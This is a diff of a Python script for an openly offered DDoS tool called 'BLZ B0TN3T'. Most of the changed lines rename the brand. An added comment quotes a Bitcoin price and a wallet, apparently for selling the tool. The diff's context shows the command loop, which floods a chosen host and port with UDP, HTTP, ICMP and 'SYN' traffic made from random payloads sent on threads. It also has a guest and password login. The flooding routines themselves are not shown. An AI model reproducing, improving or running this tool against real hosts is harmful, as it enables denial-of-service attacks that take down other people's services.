@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 #-*- coding: utf-8 -*-
 
+# PRECIO HOLANDA | 8983.88$ = 0,15BTC | network BT | wallet
+
 import sys
 import socket
 import time
@@ -26,7 +28,7 @@ info = """\033[91m
 
          \033[BLZ Info\033[91m                      
 
- \033[00m[+] Tool Was Made By BLZ B0TN3T M4ND4.\033[91m                        
+ \033[00m[+] Tool Was Made By BLZ BLZ-B0TN3T M4ND4.\033[91m                        
  \033[00m[+] Discord: BLZ#3465.\033[91m                                                            
 
 \033[00m
@@ -47,11 +49,11 @@ help = """\033[91m
 
                     \033[00mBasic Commands\033[91m                    
 
-\033[00mmethods \033[91m --> \033[00m Shows DDOS Methods For BLZ B0TN3T.\033[91m            
-\033[00mextras  \033[91m --> \033[00m Shows Extra Commands For BLZ B0TN3T.\033[91m                      
-\033[00minfo    \033[91m --> \033[00m Shows BLZ B0TN3T Info.\033[91m                         
+\033[00mmethods \033[91m --> \033[00m Shows DDOS Methods For BLZ BLZ-B0TN3T.\033[91m            
+\033[00mextras  \033[91m --> \033[00m Shows Extra Commands For BLZ BLZ-B0TN3T.\033[91m                      
+\033[00minfo    \033[91m --> \033[00m Shows BLZ BLZ-B0TN3T Info.\033[91m                         
 \033[00mclear   \033[91m --> \033[00m Clears Screen.\033[91m                             
-\033[00mexit    \033[91m --> \033[00m Exits Out Of BLZ B0TN3T.\033[91m                       
+\033[00mexit    \033[91m --> \033[00m Exits Out Of BLZ BLZ-B0TN3T.\033[91m                       
 
 \033[00m
 """
@@ -62,7 +64,7 @@ updatenotes = """\033[91m
 
 \033[00m[+] Timeout Bug Fixed.\033[91m                               
 \033[00m[+] Took Out Some Tools.\033[91m                             
-\033[00m[+] User And Pass Changed To BLZ B0TN3T.\033[91m                 
+\033[00m[+] User And Pass Changed To BLZ BLZ-B0TN3T.\033[91m                 
 \033[00m[+] To Be A Guest Type "Guest" For User And Pass.\033[91m    
 \033[00m[+] All Tools Fixed And Working.\033[91m                     
 
@@ -185,8 +187,8 @@ def main():
 	global http
 
 	while True:
-		sys.stdout.write("\x1b]2;Tool made by Offline | BLZ B0TN3T M4ND4 \x07")
-		sin = input("\033[1;00m[\033[91mOfflien@BLZ B0TN3T\033[1;00m]-\033[91m\033[00m ").lower()
+		sys.stdout.write("\x1b]2;Tool made by Offline | BLZ-B0TN3T M4ND4 \x07")
+		sin = input("\033[1;00m[\033[91mOfflien@BLZ-B0TN3T\033[1;00m]-\033[91m\033[00m ").lower()
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
@@ -199,7 +201,7 @@ def main():
 			print (extras)
 			main()
 		elif sinput == "exit":
-			print ("[\033[91mBLZ B0TN3T\033[00m] Exiting....\n")
+			print ("[\033[91mBLZ-B0TN3T\033[00m] Exiting....\n")
 			exit()
 		elif sinput == "methods":
 			print (methods)
@@ -211,76 +213,76 @@ def main():
 			print (info)
 			main()
 		elif sinput == "attacks":
-			print ("[\033[91mBLZ B0TN3T\033[00m] AT4CAND0--> {}\n".format (aid))
+			print ("[\033[91mBLZ-B0TN3T\033[00m] AT4CAND0--> {}\n".format (aid))
 			main()
 		elif sinput == "resolve":
 			liips += 1
 			host = sin.split(" ")[1]
 			host_ip = socket.gethostbyname(host)
-			print ("[\033[91mBLZ B0TN3T\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
+			print ("[\033[91mBLZ-B0TN3T\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
 			main()
 		elif sinput == ".udp":
 			if username == "Guest":
-				print ("[\033[91mBLZ B0TN3T\033[00m] .udp 127.0.0.1 80 65500 65500\n")
+				print ("[\033[91mBLZ-B0TN3T\033[00m] .udp 127.0.0.1 80 65500 65500\n")
 				main()
 			else:
 				try:
 					sinput, host, port, timer, pack = sin.split(" ")
 					socket.gethostbyname(host)
-					print ("[\033[91mBLZ B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mBLZ-B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
 					punch = random._urandom(int(pack))
 					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
 				except ValueError:
-					print ("[\033[91mBLZ B0TN3T\033[00m] 3L C0M4ND0 {} 3ST4 INC0MPL3T0.\n".format (sinput))
+					print ("[\033[91mBLZ-B0TN3T\033[00m] 3L C0M4ND0 {} 3ST4 INC0MPL3T0.\n".format (sinput))
 					main()
 				except socket.gaierror:
-					print ("[\033[91mBLZ B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mBLZ-B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
 					main()
 		elif sinput == ".http":
 			try:
 				sinput, host, port, timer, pack = sin.split(" ")
 				socket.gethostbyname(host)
-				print ("[\033[91mBLZ B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
+				print ("[\033[91mBLZ-B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
 				punch = random._urandom(int(pack))
 				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
 			except ValueError:
-				print ("[\033[91mBLZ B0TN3T\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+				print ("[\033[91mBLZ-B0TN3T\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 				main()
 			except socket.gaierror:
-				print ("[\033[91mBLZ B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
+				print ("[\033[91mBLZ-B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
 				main()
 		elif sinput == ".icm":
 			if username == "Guest":
-				print ("[\033[91mBLZ B0TN3T\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91mBLZ-B0TN3T\033[00m] You Are Not Allowed To Use This Method.\n")
 				main()
 			else:
 				try:
 					sinput, host, port, timer, pack = sin.split(" ")
 					socket.gethostbyname(host)
-					print ("[\033[91mBLZ B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91mBLZ-B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
 					punch = random._urandom(int(pack))
 					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
 				except ValueError:
-					print ("[\033[91mBLZ B0TN3T\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91mBLZ-B0TN3T\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 					main()
 				except socket.gaierror:
-					print ("[\033[91mBLZ B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91mBLZ-B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
 					main()
 		elif sinput == ".syn":
 			try:
 				sinput, host, port, timer, pack = sin.split(" ")
 				socket.gethostbyname(host)
-				print ("[\033[91mBLZ B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
+				print ("[\033[91mBLZ-B0TN3T\033[00m] Attack Sent To: {}\n".format (host))
 				punch = random._urandom(int(pack))
 				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
 			except ValueError:
-				print ("[\033[91mBLZ B0TN3T\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+				print ("[\033[91mBLZ-B0TN3T\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 				main()
 			except socket.gaierror:
-				print ("[\033[91mBLZ B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
+				print ("[\033[91mBLZ-B0TN3T\033[00m] Host: {} Invalid.\n".format (host))
 				main()
 		elif sinput == "stop":
-			print ("[\033[91mBLZ B0TN3T\033[00m] All Running Attacks Have Been Stopped.\n")
+			print ("[\033[91mBLZ-B0TN3T\033[00m] All Running Attacks Have Been Stopped.\n")
 			attack = False
 			while not attack:
 				if aid == 0:
@@ -292,18 +294,18 @@ def main():
 				udp = False
 				while not udp:
 					if aid == 0:
-						print ("[\033[91mBLZ B0TN3T\033[00m] No UDP Processes Running.")
+						print ("[\033[91mBLZ-B0TN3T\033[00m] No UDP Processes Running.")
 						udp = True
 						main()
 			if what == "icmp":
 				print ("Stopping All ICMP Attacks.\n")
 				icmp = False
 				while not icmp:
-					print ("[\033[91mBLZ B0TN3T\033[00m] No ICMP Processes Running.")
+					print ("[\033[91mBLZ-B0TN3T\033[00m] No ICMP Processes Running.")
 					udp = True
 					main()
 		else:
-			print ("[\033[91mBLZ B0TN3T\033[00m] {} Is Not A Command.\n".format(sinput))
+			print ("[\033[91mBLZ-B0TN3T\033[00m] {} Is Not A Command.\n".format(sinput))
 			main()
 
 
@@ -322,7 +324,7 @@ except KeyboardInterrupt:
 	exit()
 try:
 	passwords = ["", "Guest"]
-	password = getpass.getpass ("{+} BLZ B0TN3T M4ND4 {+}")
+	password = getpass.getpass ("{+} BLZ-B0TN3T M4ND4 {+}")
 	if user == "":
 		if password == passwords[0]:
 			os.system (clear)
